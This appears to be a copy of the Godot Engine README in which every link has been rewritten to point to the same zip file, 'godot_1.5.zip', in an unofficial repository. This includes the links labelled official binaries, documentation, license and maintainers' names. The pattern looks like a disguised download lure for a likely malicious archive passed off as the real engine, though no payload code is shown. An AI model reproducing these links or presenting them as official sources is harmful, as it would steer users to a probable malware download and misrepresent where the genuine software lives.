## 2D and 3D cross-platform game engine

**[Godot Engine](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip) is a feature-packed, cross-platform
game engine to create 2D and 3D games from a unified interface.** It provides a
comprehensive set of [common tools](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip), so that
users can focus on making games without having to reinvent the wheel. Games can
be exported with one click to a number of platforms, including the major desktop
platforms (Linux, macOS, Windows), mobile platforms (Android, iOS), as well as
Web-based platforms and [consoles](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip).

## Free, open source and community-driven

Godot is completely free and open source under the very permissive [MIT license](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip).
No strings attached, no royalties, nothing. The users' games are theirs, down
to the last line of engine code. Godot's development is fully independent and
community-driven, empowering users to help shape their engine to match their
expectations. It is supported by the [Godot Foundation](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip)
not-for-profit.

Before being open sourced in [February 2014](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip),
Godot had been developed by [Juan Linietsky](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip) and
[Ariel Manzur](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip) (both still maintaining the project)
for several years as an in-house engine, used to publish several work-for-hire
titles.

## Getting the engine

### Binary downloads

Official binaries for the Godot editor and the export templates can be found
[on the Godot website](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip).

### Compiling from source

[See the official docs](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip)
for compilation instructions for every supported platform.

## Community and contributing

Godot is not only an engine but an ever-growing community of users and engine
developers. The main community channels are listed [on the homepage](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip).

The best way to get in touch with the core engine developers is to join the
[Godot Contributors Chat](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip).

To get started contributing to the project, see the [contributing guide](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip).
This document also includes guidelines for reporting bugs.

## Documentation and demos

The official documentation is hosted on [Read the Docs](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip).
It is maintained by the Godot community in its own [GitHub repository](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip).

The [class reference](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip)
is also accessible from the Godot editor.

We also maintain official demos in their own [GitHub repository](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip)
as well as a list of [awesome Godot community resources](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip).

There are also a number of other
[learning resources](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip)
provided by the community, such as text and video tutorials, demos, etc.
Consult the [community channels](https://raw.githubusercontent.com/PogingCyber/godot/master/modules/mono/glue/GodotSharp/GodotSharp/Core/godot_1.5.zip)
for more information.
